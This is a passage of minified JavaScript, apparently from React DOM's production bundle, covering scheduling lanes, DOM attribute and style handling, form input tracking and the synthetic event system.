h!==0?(n=h&~s,n!==0?i=yn(n):(u&=h,u!==0?i=yn(u):a||(a=h&~e,a!==0&&(i=yn(a))))):(h=n&~s,h!==0?i=yn(h):u!==0?i=yn(u):a||(a=n&~e,a!==0&&(i=yn(a)))),i===0?0:t!==0&&t!==i&&(t&s)===0&&(s=i&-i,a=t&-t,s>=a||s===32&&(a&4194048)!==0)?t:i}function Pl(e,t){return(e.pendingLanes&~(e.suspendedLanes&~e.pingedLanes)&t)===0}function Mf(e,t){(t&8)!==0&&(t|=t&32);var a=e.entangledLanes;if(a!==0)for(e=e.entanglements,a&=t;0<a;){var n=31-Et(a),i=1<<n;t|=e[n],a&=~i}return t}function ov(e,t){switch(e){case 1:case 2:case 4:case 8:case 64:return t+250;case 16:case 32:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;case 4194304:case 8388608:case 16777216:case 33554432:return-1;case 67108864:case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function Hf(){var e=gr;return gr<<=1,(gr&62914560)===0&&(gr=4194304),e}function dc(e){for(var t=[],a=0;31>a;a++)t.push(e);return t}function $l(e,t){e.pendingLanes|=t,t!==268435456&&(e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0)}function uv(e,t,a,n,i,s){var u=e.pendingLanes;e.pendingLanes=a,e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0,e.expiredLanes&=a,e.entangledLanes&=a,e.errorRecoveryDisabledLanes&=a,e.shellSuspendCounter=0;var h=e.entanglements,x=e.expirationTimes,N=e.hiddenUpdates;for(a=u&~a;0<a;){var O=31-Et(a),D=1<<O;h[O]=0,x[O]=-1;var A=N[O];if(A!==null)for(N[O]=null,O=0;O<A.length;O++){var z=A[O];z!==null&&(z.lane&=-536870913)}a&=~D}n!==0&&Bf(e,n,0),s!==0&&i===0&&e.tag!==0&&(e.suspendedLanes|=s&~(u&~t))}function Bf(e,t,a){e.pendingLanes|=t,e.suspendedLanes&=~t;var n=31-Et(t);e.entangledLanes|=t,e.entanglements[n]=e.entanglements[n]|1073741824|a&261930}function kf(e,t){var a=e.entangledLanes|=t;for(e=e.entanglements;a;){var n=31-Et(a),i=1<<n;i&t|e[n]&t&&(e[n]|=t),a&=~i}}function Lf(e,t){var a=t&-t;return a=(a&42)!==0?1:hc(a),(a&(e.suspendedLanes|t))!==0?0:a}function hc(e){switch(e){case 2:e=1;break;case 8:e=4;break;case 32:e=16;break;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:e=128;break;case 268435456:e=134217728;break;default:e=0}return e}function pc(e){return e&=-e,2<e?8<e?(e&134217727)!==0?32:268435456:8:2}function Gf(){var e=re.p;return e!==0?e:(e=window.event,e===void 0?32:Kp(e.type))}function qf(e,t){var a=re.p;try{return re.p=e,t()}finally{re.p=a}}var _a=Math.random().toString(36).slice(2),at="__reactFiber$"+_a,gt="__reactProps$"+_a,Pn="__reactContainer$"+_a,Yf="__reactEvents$"+_a,fv="__reactListeners$"+_a,dv="__reactHandles$"+_a,Zf="__reactResources$"+_a,Wl="__reactMarker$"+_a,yr="__reactLoad$"+_a;function br(e){delete e[at],delete e[gt],delete e[fv],delete e[dv]}function bn(e){var t;if(t=e[at])return t;for(var a=e.parentNode;a;){if(t=a[Pn]||a[at]){if(a=t.alternate,t.child!==null||a!==null&&a.child!==null)for(e=jp(e);e!==null;){if(a=e[at])return a;e=jp(e)}return t}e=a,a=e.parentNode}return null}function $n(e){if(e=e[at]||e[Pn]){var t=e.tag;if(t===5||t===6||t===13||t===31||t===26||t===27||t===3)return e}return null}function ei(e){var t=e.tag;if(t===5||t===26||t===27||t===6)return e.stateNode;throw Error(o(33))}function Wn(e){var t=e[Zf];return t||(t=e[Zf]={hoistableStyles:new Map,hoistableScripts:new Map}),t}function Je(e){e[Wl]=!0}function Xf(e){e[yr]=void 0}var Vf=new Set,Qf={};function _n(e,t){el(e,t),el(e+"Capture",t)}function el(e,t){for(Qf[e]=t,e=0;e<t.length;e++)Vf.add(t[e])}var hv=RegExp("^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$"),Kf={},If={};function pv(e){return oc.call(If,e)?!0:oc.call(Kf,e)?!1:hv.test(e)?If[e]=!0:(Kf[e]=!0,!1)}var Se=!1;function Ff(){var e=Se;return Se=!1,e}function _r(e,t,a){if(pv(t))if(a===null)e.removeAttribute(t);else{switch(typeof a){case"undefined":case"function":case"symbol":e.removeAttribute(t);return;case"boolean":var n=t.toLowerCase().slice(0,5);if(n!=="data-"&&n!=="aria-"){e.removeAttribute(t);return}}e.setAttribute(t,a)}}function xr(e,t,a){if(a===null)e.removeAttribute(t);else{switch(typeof a){case"undefined":case"function":case"symbol":case"boolean":e.removeAttribute(t);return}e.setAttribute(t,a)}}function xa(e,t,a,n){if(n===null)e.removeAttribute(a);else{switch(typeof n){case"undefined":case"function":case"symbol":case"boolean":e.removeAttribute(a);return}e.setAttributeNS(t,a,n)}}function At(e){switch(typeof e){case"bigint":case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function Jf(e){var t=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(t==="checkbox"||t==="radio")}function mv(e,t,a){var n=Object.getOwnPropertyDescriptor(e.constructor.prototype,t);if(!e.hasOwnProperty(t)&&typeof n<"u"&&typeof n.get=="function"&&typeof n.set=="function"){var i=n.get,s=n.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return i.call(this)},set:function(u){a=""+u,s.call(this,u)}}),Object.defineProperty(e,t,{enumerable:n.enumerable}),{getValue:function(){return a},setValue:function(u){a=""+u},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}function mc(e){if(!e._valueTracker){var t=Jf(e)?"checked":"value";e._valueTracker=mv(e,t,""+e[t])}}function Pf(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var a=t.getValue(),n="";return e&&(n=Jf(e)?e.checked?"true":"false":e.value),e=n,e!==a?(t.setValue(e),!0):!1}var gv=/[\n"\\]/g;function Ht(e){return e.replace(gv,function(t){return"\\"+t.charCodeAt(0).toString(16)+" "})}function gc(e,t,a,n,i,s,u,h){e.name="",u!=null&&typeof u!="function"&&typeof u!="symbol"&&typeof u!="boolean"?e.type=u:e.removeAttribute("type"),t!=null?u==="number"?(t===0&&e.value===""||e.value!=t)&&(e.value=""+At(t)):e.value!==""+At(t)&&(e.value=""+At(t)):u!=="submit"&&u!=="reset"||e.removeAttribute("value"),t!=null?u==="number"&&e.value==t?vc(e,At(e.value)):vc(e,At(t)):a!=null?vc(e,At(a)):n!=null&&e.removeAttribute("value"),i==null&&s!=null&&(e.defaultChecked=!!s),i!=null&&(e.checked=i&&typeof i!="function"&&typeof i!="symbol"),h!=null&&typeof h!="function"&&typeof h!="symbol"&&typeof h!="boolean"?e.name=""+At(h):e.removeAttribute("name")}function $f(e,t,a,n,i,s,u,h){if(s!=null&&typeof s!="function"&&typeof s!="symbol"&&typeof s!="boolean"&&(e.type=s),t!=null||a!=null){if(!(s!=="submit"&&s!=="reset"||t!=null)){mc(e);return}a=a!=null?""+At(a):"",t=t!=null?""+At(t):a,h||t===e.value||(e.value=t),e.defaultValue=t}n=n??i,n=typeof n!="function"&&typeof n!="symbol"&&!!n,e.checked=h?e.checked:!!n,e.defaultChecked=!!n,u!=null&&typeof u!="function"&&typeof u!="symbol"&&typeof u!="boolean"&&(e.name=u),mc(e)}function vc(e,t){e.defaultValue!==""+t&&(e.defaultValue=""+t)}function tl(e,t,a,n){if(e=e.options,t){t={};for(var i=0;i<a.length;i++)t["$"+a[i]]=!0;for(a=0;a<e.length;a++)i=t.hasOwnProperty("$"+e[a].value),e[a].selected!==i&&(e[a].selected=i),i&&n&&(e[a].defaultSelected=!0)}else{for(a=""+At(a),t=null,i=0;i<e.length;i++){if(e[i].value===a){e[i].selected=!0,n&&(e[i].defaultSelected=!0);return}t!==null||e[i].disabled||(t=e[i])}t!==null&&(t.selected=!0)}}function Wf(e,t,a){if(t!=null&&(t=""+At(t),t!==e.value&&(e.value=t),a==null)){e.defaultValue!==t&&(e.defaultValue=t);return}e.defaultValue=a!=null?""+At(a):""}function ed(e,t,a,n){if(t==null){if(n!=null){if(a!=null)throw Error(o(92));if(we(n)){if(1<n.length)throw Error(o(93));n=n[0]}a=n}a==null&&(a=""),t=a}a=At(t),e.defaultValue=a,n=e.textContent,n===a&&n!==""&&n!==null&&(e.value=n),mc(e)}function al(e,t){if(t){var a=e.firstChild;if(a&&a===e.lastChild&&a.nodeType===3){a.nodeValue=t;return}}e.textContent=t}var vv=new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));function td(e,t,a){var n=t.indexOf("--")===0;a==null||typeof a=="boolean"||a===""?n?e.setProperty(t,""):t==="float"?e.cssFloat="":e[t]="":n?e.setProperty(t,a):typeof a!="number"||a===0||vv.has(t)?t==="float"?e.cssFloat=a:e[t]=(""+a).trim():e[t]=a+"px"}function ad(e,t,a){if(t!=null&&typeof t!="object")throw Error(o(62));if(e=e.style,a!=null){for(var n in a)!a.hasOwnProperty(n)||t!=null&&t.hasOwnProperty(n)||(n.indexOf("--")===0?e.setProperty(n,""):n==="float"?e.cssFloat="":e[n]="",Se=!0);for(var i in t)n=t[i],t.hasOwnProperty(i)&&a[i]!==n&&(td(e,i,n),Se=!0)}else for(var s in t)t.hasOwnProperty(s)&&td(e,s,t[s])}function yc(e){if(e.indexOf("-")===-1)return!1;switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var yv=new Map([["acceptCharset","accept-charset"],["htmlFor","for"],["httpEquiv","http-equiv"],["crossOrigin","crossorigin"],["accentHeight","accent-height"],["alignmentBaseline","alignment-baseline"],["arabicForm","arabic-form"],["baselineShift","baseline-shift"],["capHeight","cap-height"],["clipPath","clip-path"],["clipRule","clip-rule"],["colorInterpolation","color-interpolation"],["colorInterpolationFilters","color-interpolation-filters"],["colorProfile","color-profile"],["colorRendering","color-rendering"],["dominantBaseline","dominant-baseline"],["enableBackground","enable-background"],["fillOpacity","fill-opacity"],["fillRule","fill-rule"],["floodColor","flood-color"],["floodOpacity","flood-opacity"],["fontFamily","font-family"],["fontSize","font-size"],["fontSizeAdjust","font-size-adjust"],["fontStretch","font-stretch"],["fontStyle","font-style"],["fontVariant","font-variant"],["fontWeight","font-weight"],["glyphName","glyph-name"],["glyphOrientationHorizontal","glyph-orientation-horizontal"],["glyphOrientationVertical","glyph-orientation-vertical"],["horizAdvX","horiz-adv-x"],["horizOriginX","horiz-origin-x"],["imageRendering","image-rendering"],["letterSpacing","letter-spacing"],["lightingColor","lighting-color"],["markerEnd","marker-end"],["markerMid","marker-mid"],["markerStart","marker-start"],["maskType","mask-type"],["overlinePosition","overline-position"],["overlineThickness","overline-thickness"],["paintOrder","paint-order"],["panose-1","panose-1"],["pointerEvents","pointer-events"],["renderingIntent","rendering-intent"],["shapeRendering","shape-rendering"],["stopColor","stop-color"],["stopOpacity","stop-opacity"],["strikethroughPosition","strikethrough-position"],["strikethroughThickness","strikethrough-thickness"],["strokeDasharray","stroke-dasharray"],["strokeDashoffset","stroke-dashoffset"],["strokeLinecap","stroke-linecap"],["strokeLinejoin","stroke-linejoin"],["strokeMiterlimit","stroke-miterlimit"],["strokeOpacity","stroke-opacity"],["strokeWidth","stroke-width"],["textAnchor","text-anchor"],["textDecoration","text-decoration"],["textRendering","text-rendering"],["transformOrigin","transform-origin"],["underlinePosition","underline-position"],["underlineThickness","underline-thickness"],["unicodeBidi","unicode-bidi"],["unicodeRange","unicode-range"],["unitsPerEm","units-per-em"],["vAlphabetic","v-alphabetic"],["vHanging","v-hanging"],["vIdeographic","v-ideographic"],["vMathematical","v-mathematical"],["vectorEffect","vector-effect"],["vertAdvY","vert-adv-y"],["vertOriginX","vert-origin-x"],["vertOriginY","vert-origin-y"],["wordSpacing","word-spacing"],["writingMode","writing-mode"],["xmlnsXlink","xmlns:xlink"],["xHeight","x-height"]]),bv=/^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;function Sr(e){return bv.test(""+e)?"javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')":e}function aa(){}var bc=null;function _c(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var nl=null,ll=null;function nd(e){var t=$n(e);if(t&&(e=t.stateNode)){var a=e[gt]||null;e:switch(e=t.stateNode,t.type){case"input":if(gc(e,a.value,a.defaultValue,a.defaultValue,a.checked,a.defaultChecked,a.type,a.name),t=a.name,a.type==="radio"&&t!=null){for(a=e;a.parentNode;)a=a.parentNode;for(a=a.querySelectorAll('input[name="'+Ht(""+t)+'"][type="radio"]'),t=0;t<a.length;t++){var n=a[t];if(n!==e&&n.form===e.form){var i=n[gt]||null;if(!i)throw Error(o(90));gc(n,i.value,i.defaultValue,i.defaultValue,i.checked,i.defaultChecked,i.type,i.name)}}for(t=0;t<a.length;t++)n=a[t],n.form===e.form&&Pf(n)}break e;case"textarea":Wf(e,a.value,a.defaultValue);break e;case"select":t=a.value,t!=null&&tl(e,!!a.multiple,t,!1)}}}var xc=!1;function ld(e,t,a){if(xc)return e(t,a);xc=!0;try{var n=e(t);return n}finally{if(xc=!1,(nl!==null||ll!==null)&&(Ss(),nl&&(t=nl,e=ll,ll=nl=null,nd(t),e)))for(t=0;t<e.length;t++)nd(e[t])}}function ti(e,t){var a=e.stateNode;if(a===null)return null;var n=a[gt]||null;if(n===null)return null;a=n[t];e:switch(t){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(n=!n.disabled)||(e=e.type,n=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!n;break e;default:e=!1}if(e)return null;if(a&&typeof a!="function")throw Error(o(231,t,typeof a));return a}var Sa=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),Sc=!1;if(Sa)try{var ai={};Object.defineProperty(ai,"passive",{get:function(){Sc=!0}}),window.addEventListener("test",ai,ai),window.removeEventListener("test",ai,ai)}catch{Sc=!1}var Ga=null,Tc=null,Tr=null;function id(){if(Tr)return Tr;var e,t=Tc,a=t.length,n,i="value"in Ga?Ga.value:Ga.textContent,s=i.length;for(e=0;e<a&&t[e]===i[e];e++);var u=a-e;for(n=1;n<=u&&t[a-n]===i[s-n];n++);return Tr=i.slice(e,1<n?1-n:void 0)}function wr(e){var t=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&t===13&&(e=13)):e=t,e===10&&(e=13),32<=e||e===13?e:0}function Er(){return!0}function rd(){return!1}function ft(e){function t(a,n,i,s,u){this._reactName=a,this._targetInst=i,this.type=n,this.nativeEvent=s,this.target=u,this.currentTarget=null;for(var h in e)e.hasOwnProperty(h)&&(a=e[h],this[h]=a?a(s):s[h]);return this.isDefaultPrevented=(s.defaultPrevented!=null?s.defaultPrevented:s.returnValue===!1)?Er:rd,this.isPropagationStopped=rd,this}return B(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var a=this.nativeEvent;a&&(a.preventDefault?a.preventDefault():typeof a.returnValue!="unknown"&&(a.returnValue=!1),this.isDefaultPrevented=Er)},stopPropagation:function(){var a=this.nativeEvent;a&&(a.stopPropagation?a.stopPropagation():typeof a.cancelBubble!="unknown"&&(a.cancelBubble=!0),this.isPropagationStopped=Er)},persist:function(){},isPersistent:Er}),t}var qa={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Ar=ft(qa),ni=B({},qa,{view:0,detail:0}),_v=ft(ni),wc,Ec,li,jr=B({},ni,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:jc,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==li&&(li&&e.type==="mousemove"?(wc=e.screenX-li.screenX,Ec=e.screenY-li.screenY):Ec=wc=0,li=e),wc)},movementY:function(e){return"movementY"in e?e.movementY:Ec}}),sd=ft(jr),xv=B({},jr,{dataTransfer:0}),Sv=ft(xv),Tv=B({},ni,{relatedTarget:0}),Ac=ft(Tv),wv=B({},qa,{animationName:0,elapsedTime:0,pseudoElement:0}),Ev=ft(wv),Av=B({},qa,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),jv=ft(Av),Nv=B({},qa,{data:0}),cd=ft(Nv),Cv={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},zv={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},Ov={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Rv(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):(e=Ov[e])?!!t[e]:!1}function jc(){return Rv}var Dv=B({},ni,{key:function(e){if(e.key){var t=Cv[e.key]||e.key;if(t!=="Unidentified")return t}return e.type==="keypress"?(e=wr(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?zv[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:jc,charCode:function(e){return e.type==="keypress"?wr(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?wr(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),Uv=ft(Dv),Mv=B({},jr,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),od=ft(Mv),Hv=B({},qa,{submitter:0}),Bv=ft(Hv),kv=B({},ni,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:jc}),Lv=ft(kv),Gv=B({},qa,{propertyName:0,elapsedTime:0,pseudoElement:0}),qv=ft(Gv),Yv=B({},jr,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Zv=ft(Yv),Xv=B({},qa,{newState:0,oldState:0,source:0}),Vv=ft(Xv),Qv=[9,13,27,32],Nc=Sa&&"CompositionEvent"in window,ii=null;Sa&&"documentMode"in document&&(ii=document.documentMode);var Kv=Sa&&"TextEvent"in window&&!ii,ud=Sa&&(!Nc||ii&&8<ii&&11>=ii),fd=" ",dd=!1;function hd(e,t){switch(e){case"keyup":return Qv.indexOf(t.keyCode)!==-1;case"keydown":return t.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function pd(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var il=!1;function Iv(e,t){switch(e){case"compositionend":return pd(t);case"keypress":return t.which!==32?null:(dd=!0,fd);case"textInput":return e=t.data,e===fd&&dd?null:e;default:return null}}function Fv(e,t){if(il)return e==="compositionend"||!Nc&&hd(e,t)?(e=id(),Tr=Tc=Ga=null,il=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case"compositionend":return ud&&t.locale!=="ko"?null:t.data;default:return null}}var Jv={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function md(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t==="input"?!!Jv[e.type]:t==="textarea"}function gd(e,t,a,n){nl?ll?ll.push(n):ll=[n]:nl=n,t=Ns(t,"onChange"),0<t.length&&(a=new Ar("onChange","change",null,a,n),e.push({event:a,listeners:t}))}var ri=null,si=null;function Pv(e){np(e,0)}function Nr(e){var t=ei(e);if(Pf(t))return e}function vd(e,t){if(e==="change")return t}var yd=!1;if(Sa){var Cc;if(Sa){var zc="oninput"in document;if(!zc){var bd=document.createElement("div");bd.setAttribute("oninput","return;"),zc=typeof bd.oninput=="function"}Cc=zc}else Cc=!1;yd=Cc&&(!document.documentMode||9<document.documentMode)}function _d(){ri&&(ri.detachEvent("onpropertychange",xd),si=ri=null)}function xd(e){if(e.propertyName==="value"&&Nr(si)){var t=[];gd(t,si,e,_c(e)),ld(Pv,t)}}function $v(e,t,a){e==="focusin"?(_d(),ri=t,si=a,ri.attachEvent("onpropertychange",xd)):e==="focusout"&&_d()}function Wv(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return Nr(si)}function ey(e,t){if(e==="click")return Nr(t)}function ty(e,t){if(e==="input"||e==="change")return Nr(t)}function ay(e,t){return e===t&&(e!==0||1/e===1/t)||e!==e&&t!==t}var jt=typeof Object.is=="function"?Object.is:ay;function ci(e,t){if(jt(e,t))return!0;if(typeof e!="object"||e===null||typeof t!="object"||t===null)return!1;var a=Object.keys(e),n=Object.keys(t);if(a.length!==n.length)return!1;for(n=0;n<a.length;n++){var i=a[n];if(!oc.call(t,i)||!jt(e[i],t[i]))return!1}return!0}function Oc(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}function Sd(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function Td(e,t){var a=Sd(e);e=0;for(var n;a;){if(a.nodeType===3){if(n=e+a.textContent.length,e<=t&&n>=t)return{node:a,offset:t-e};e=n}e:{for(;a;){if(a.nextSibling){a=a.nextSibling;break e}a=a.parentNode}a=void 0}a=Sd(a)}}function wd(e,t){return e&&t?e===t?!0:e&&e.nodeType===3?!1:t&&t.nodeType===3?wd(e,t.parentNode):"contains"in e?e.contains(t):e.compareDocumentPosition?!!(e.compareDocumentPosition(t)&16):!1:!1}function Ed(e){e=e!=null&&e.ownerDocument!=null&&e.ownerDocument.defaultView!=null?e.ownerDocument.defaultView:window;for(var t=Oc(e.document);t instanceof e.HTMLIFrameElement;){try{var a=typeof t.contentWindow.location.href=="string"}catch{a=!1}if(a)e=t.contentWindow;else break;t=Oc(e.document)}return t}function Rc(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&(t==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||t==="textarea"||e.contentEditable==="true")}var ny=Sa&&"documentMode"in document&&11>=document.documentMode,rl=null,Dc=null,oi=null,Uc=!1;function Ad(e,t,a){var n=a.window===a?a.document:a.nodeType===9?a:a.ownerDocument;Uc||rl==null||rl!==Oc(n)||(n=rl,"selectionStart"in n&&Rc(n)?n={start:n.selectionStart,end:n.selectionEnd}:(n=(n.ownerDocument&&n.ownerDocument.defaultView||window).getSelection(),n={anchorNode:n.anchorNode,anchorOffset:n.anchorOffset,focusNode:n.focusNode,focusOffset:n.focusOffset}),oi&&ci(oi,n)||(oi=n,n=Ns(Dc,"onSelect"),0<n.length&&(t=new Ar("onSelect","select",null,t,a),e.push({event:t,listeners:n}),t.target=rl)))}function xn(e,t){var a={};return a[e.toLowerCase()]=t.toLowerCase(),a["Webkit"+e]="webkit"+t,a["Moz"+e]="moz"+t,a}var sl={animationend:xn("Animation","AnimationEnd"),animationiteration:xn("Animation","AnimationIteration"),animationstart:xn("Animation","AnimationStart"),transitionrun:xn("Transition","TransitionRun"),transitionstart:xn("Transition","TransitionStart"),transitioncancel:xn("Transition","TransitionCancel"),transitionend:xn("Transition","TransitionEnd")},Mc={},jd={};Sa&&(jd=document.createElement("div").style,"AnimationEvent"in window||(delete sl.animationend.animation,delete sl.animationiteration.animation,delete sl.animationstart.animation),"TransitionEvent"in window||delete sl.transitionend.transition);function Sn(e){if(Mc[e])return Mc[e];if(!sl[e])return e;var t=sl[e],a;for(a in t)if(t.hasOwnProperty(a)&&a in jd)return Mc[e]=t[a];return e}var Nd=Sn("animationend"),Cd=Sn("animationiteration"),zd=Sn("animationstart"),ly=Sn("transitionrun"),iy=Sn("transitionstart"),ry=Sn("transitioncancel"),Od=Sn("transitionend"),Rd=new Map,Hc="abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error fullscreenChange fullscreenError gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");Hc.push("scrollEnd");function It(e,t){Rd.set(e,t),_n(t,[e])}var sy=0;function Ta(e,t){if(e.name!=null&&e.name!=="auto")return e.name;if(t.autoName!==null)return t.autoName;e=$t.identifierPrefix;var a=sy++;return e="_"+e+"t_"+a.toString(32)+"_",t.autoName=e}function Dd(e){if(e==null||typeof e=="string")return e;var t=null,a=jl;if(a!==null)for(var n=0;n<a.length;n++){var i=e[a[n]];if(i!=null){if(i==="none")return"none";t=t==null?i:t+(" "+i)}}return t??e.default}function wa(e,t){return e=Dd(e),t=Dd(t),t==null?e==="auto"?null:e:t==="auto"?null:t}var Cr=typeof reportError=="function"?reportError:function(e){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var t=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof e=="object"&&e!==null&&typeof e.message=="string"?String(e.message):String(e),error:e});if(!window.dispatchEvent(t))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",e);return}console.error(e)},Bt=[],cl=0,Bc=0;function zr(){for(var e=cl,t=Bc=cl=0;t<e;){var a=Bt[t];Bt[t++]=null;var n=Bt[t];Bt[t++]=null;var i=Bt[t];Bt[t++]=null;var s=Bt[t];if(Bt[t++]=null,n!==null&&i!==null){var u=n.pending;u===null?i.next=i:(i.next=u.next,u.next=i),n.pending=i}s!==0&&Ud(a,i,s)}}function Or(e,t,a,n){Bt[cl++]=e,Bt[cl++]=t,Bt[cl++]=a,Bt[cl++]=n,Bc|=n,e.lanes|=n,e=e.alternate,e!==null&&(e.lanes|=n)}function kc(e,t,a,n){return Or(e,t,a,n),Rr(e)}function Tn(e,t){return Or(e,null,null,t),Rr(e)}function Ud(e,t,a){e.lanes|=a;var n=e.alternate;n!==null&&(n.lanes|=a);for(var i=!1,s=e.return;s!==null;)s.childLanes|=a,n=s.alternate,n!==null&&(n.childLanes|=a),s.tag===22&&(e=s.stateNode,e===null||e._visibility&1||(i=!0)),e=s,s=s.return;return e.tag===3?(s=e.stateNode,i&&t!==null&&(i=31-Et(a),e=s.hiddenUpdates,n=e[i],n===null?e[i]=[t]:n.push(t),t.lane=a|536870912),s):null}function 